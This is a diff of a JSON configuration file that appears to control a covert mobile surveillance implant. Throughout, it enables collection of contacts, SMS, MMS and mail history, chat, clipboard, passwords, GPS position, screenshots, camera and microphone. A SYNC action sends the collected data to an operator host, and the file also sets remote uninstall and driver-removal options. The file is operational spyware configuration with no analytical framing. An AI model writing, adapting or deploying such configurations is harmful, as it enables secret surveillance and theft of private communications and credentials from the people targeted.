@@ -1,4 +1,57 @@
 {
+    "events": [
+        {
+            "start": 0,
+            "te": "23:59:59",
+            "event": "timer",
+            "enabled": true,
+            "ts": "00:00:00",
+            "desc": "STARTUP",
+            "subtype": "loop"
+        },
+        {
+            "te": "23:59:59",
+            "event": "timer",
+            "delay": 60,
+            "subtype": "loop",
+            "enabled": true,
+            "ts": "00:00:00",
+            "desc": "SYNC",
+            "repeat": 1
+        },
+        {
+            "process": "com.android.contacts",
+            "end": 3,
+            "event": "process",
+            "delay": 60,
+            "enabled": true,
+            "focus": false,
+            "window": false,
+            "desc": "",
+            "repeat": 2
+        },
+        {
+            "start": 4,
+            "event": "process",
+            "enabled": true,
+            "window": false,
+            "process": "*calc*",
+            "focus": false,
+            "desc": ""
+        },
+        {"start": 1, "enabled": true, "event": "standby", "desc": ""}
+    ],
+    "globals": {
+        "advanced": true,
+        "wipe": false,
+        "version": 2012041601,
+        "remove_driver": true,
+        "quota": {"min": 104857.6, "max": 104857600},
+        "type": "mobile",
+        "collapsed": false,
+        "migrated": false,
+        "nohide": []
+    },
     "modules": [
         {"module": "addressbook"},
         {"module": "application"},
@@ -7,172 +60,90 @@
         {"module": "camera", "quality": "med"},
         {"module": "chat"},
         {"module": "clipboard"},
-        {"module": "conference", "_type": "mobile", "_platform": "winmo", "number": ""},
         {
-            "position": true,
             "camera": true,
             "network": {"enabled": false, "processes": []},
+            "position": true,
             "call": true,
-            "module": "crisis",
             "hook": {"enabled": true, "processes": []},
             "mic": true,
+            "module": "crisis",
             "synchronize": false
         },
         {"module": "device", "list": false},
-        {"module": "keylog", "_type": "desktop,mobile", "_platform": "windows,osx,ios,linux"},
-        {"module": "livemic", "_type": "mobile", "_platform": "winmo", "number": ""},
         {
-            "module": "messages",
-            "mms": {
-                "enabled": true,
-                "filter": {"datefrom": "2014-09-09 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true}
-            },
-            "sms": {
-                "enabled": true,
-                "filter": {"datefrom": "2014-09-09 00:00:00", "dateto": "2100-01-01 00:00:00", "history": true}
-            },
             "mail": {
                 "enabled": true,
                 "filter": {
-                    "datefrom": "2014-09-09 00:00:00",
-                    "dateto": "2100-01-01 00:00:00",
+                    "maxsize": 100000,
                     "history": true,
-                    "maxsize": 100000
+                    "dateto": "2100-01-01 00:00:00",
+                    "datefrom": "2014-11-10 00:00:00"
                 }
+            },
+            "sms": {
+                "enabled": true,
+                "filter": {"history": true, "dateto": "2100-01-01 00:00:00", "datefrom": "2014-11-10 00:00:00"}
+            },
+            "module": "messages",
+            "mms": {
+                "enabled": true,
+                "filter": {"history": true, "dateto": "2100-01-01 00:00:00", "datefrom": "2014-11-10 00:00:00"}
             }
         },
         {"module": "mic", "autosense": false, "threshold": 0.22, "silence": 5},
         {"module": "password"},
-        {"gps": false, "module": "position", "cell": true, "wifi": true},
-        {"module": "screenshot", "quality": "med", "onlywindow": false},
-        {"module": "url", "_type": "desktop,mobile", "_platform": "windows,osx,ios,blackberry,winmo,linux"}
-    ],
-    "events": [
-        {
-            "start": 0,
-            "event": "timer",
-            "te": "23:59:59",
-            "enabled": true,
-            "subtype": "loop",
-            "desc": "STARTUP",
-            "ts": "00:00:00"
-        },
-        {
-            "start": 1,
-            "event": "timer",
-            "delay": 60,
-            "te": "23:59:59",
-            "enabled": true,
-            "subtype": "loop",
-            "desc": "SCREENSHOT",
-            "ts": "00:00:00",
-            "repeat": 1
-        },
-        {
-            "start": 2,
-            "event": "timer",
-            "delay": 30,
-            "te": "23:59:59",
-            "enabled": true,
-            "subtype": "loop",
-            "desc": "CAMERA",
-            "ts": "00:00:00",
-            "repeat": 2
-        },
-        {
-            "start": 3,
-            "event": "timer",
-            "te": "23:59:59",
-            "enabled": true,
-            "subtype": "loop",
-            "desc": "POSITION",
-            "ts": "00:00:00"
-        },
-        {
-            "start": 4,
-            "event": "timer",
-            "delay": 60,
-            "te": "23:59:59",
-            "enabled": true,
-            "subtype": "loop",
-            "desc": "SYNC",
-            "ts": "00:00:00",
-            "repeat": 4
-        },
-        {
-            "start": 5,
-            "event": "process",
-            "process": "*calc*",
-            "focus": false,
-            "enabled": true,
-            "window": false,
-            "desc": ""
-        },
-        {
-            "start": 6,
-            "event": "process",
-            "process": "*contact*",
-            "delay": 5,
-            "enabled": true,
-            "end": 7,
-            "iter": 1,
-            "window": false,
-            "desc": "",
-            "focus": false,
-            "repeat": 8
-        }
+        {"gps": true, "module": "position", "wifi": false, "cell": false},
+        {"onlywindow": false, "module": "screenshot", "quality": "med"}
     ],
     "actions": [
         {
+            "desc": "STARTUP",
             "subactions": [
                 {"action": "module", "module": "device", "status": "start"},
-                {"action": "module", "module": "calendar", "status": "start"},
                 {"action": "module", "module": "addressbook", "status": "start"},
-                {"action": "module", "module": "messages", "status": "start"},
-                {"action": "module", "module": "chat", "status": "start"},
+                {"action": "module", "module": "camera", "status": "start"},
+                {"action": "module", "module": "position", "status": "start"},
+                {"action": "module", "module": "screenshot", "status": "start"},
                 {"action": "module", "module": "application", "status": "start"},
-                {"action": "module", "module": "call", "status": "start"}
-            ],
-            "desc": "STARTUP"
+                {"action": "module", "module": "calendar", "status": "start"},
+                {"action": "module", "module": "call", "status": "start"},
+                {"action": "module", "module": "chat", "status": "start"},
+                {"action": "module", "module": "clipboard", "status": "start"},
+                {"action": "module", "module": "messages", "status": "start"},
+                {"action": "module", "module": "password", "status": "start"}
+            ]
         },
         {
-            "subactions": [{"action": "module", "module": "screenshot", "status": "start"}],
-            "desc": "SCREENSHOT"
-        },
-        {"subactions": [{"action": "module", "module": "camera", "status": "start"}], "desc": "CAMERA"},
-        {"subactions": [{"action": "module", "module": "position", "status": "start"}], "desc": "POSITION"},
-        {
+            "desc": "SYNC",
             "subactions": [
                 {
                     "action": "synchronize",
-                    "maxdelay": 0,
-                    "cell": false,
-                    "host": "192.168.100.193",
-                    "bandwidth": 500000,
-                    "stop": false,
                     "wifi": true,
-                    "mindelay": 0
-                }
-            ],
-            "desc": "SYNC"
+                    "mindelay": 0,
+                    "bandwidth": 500000,
+                    "host": "$(HOSTNAME)",
+                    "stop": false,
+                    "maxdelay": 0,
+                    "cell": false
+                },
+                {"action": "module", "module": "camera", "status": "start"}
+            ]
         },
-        {"subactions": [{"action": "uninstall"}], "desc": ""},
-        {"subactions": [{"action": "module", "module": "call", "status": "stop"}], "desc": ""},
-        {"subactions": [{"action": "module", "module": "mic", "status": "stop"}], "desc": ""},
         {
-            "subactions": [{"action": "module", "module": "mic", "status": "start"}, {"action": "log", "text": "Start mic"}],
-            "desc": ""
-        }
-    ],
-    "globals": {
-        "remove_driver": true,
-        "advanced": true,
-        "quota": {"min": 104857.6, "max": 104857600},
-        "collapsed": false,
-        "nohide": [],
-        "migrated": false,
-        "type": "mobile",
-        "wipe": false,
-        "version": 2012041601
-    }
+            "desc": "",
+            "subactions": [
+                {"action": "module", "module": "call", "status": "stop"},
+                {"action": "module", "module": "mic", "status": "start"}
+            ]
+        },
+        {
+            "desc": "",
+            "subactions": [
+                {"action": "module", "module": "mic", "status": "stop"},
+                {"action": "module", "module": "call", "status": "start"}
+            ]
+        },
+        {"desc": "", "subactions": [{"action": "uninstall"}]}
+    ]
 }
